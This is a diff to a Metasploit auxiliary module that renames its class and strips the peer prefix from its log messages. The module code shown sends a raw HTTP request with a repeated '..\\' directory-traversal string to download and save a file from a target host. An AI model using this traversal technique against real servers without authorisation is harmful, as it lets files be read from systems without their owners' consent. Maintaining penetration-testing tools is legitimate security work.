@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
@@ -40,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    vprint_status("#{peer} - Attempting to download: #{datastore['RELATIVE_FILE_PATH']}")
+    vprint_status("Attempting to download: #{datastore['RELATIVE_FILE_PATH']}")
 
     traversal = "..\\" * datastore['TRAVERSAL_DEPTH']
     res = send_request_raw({
@@ -62,9 +62,9 @@ class Metasploit3 < Msf::Auxiliary
         res.body,
         fname
       )
-      print_good("#{peer} - File saved in: #{path}")
+      print_good("File saved in: #{path}")
     else
-      vprint_error("#{peer} - Nothing was downloaded")
+      vprint_error("Nothing was downloaded")
     end
   end
 end
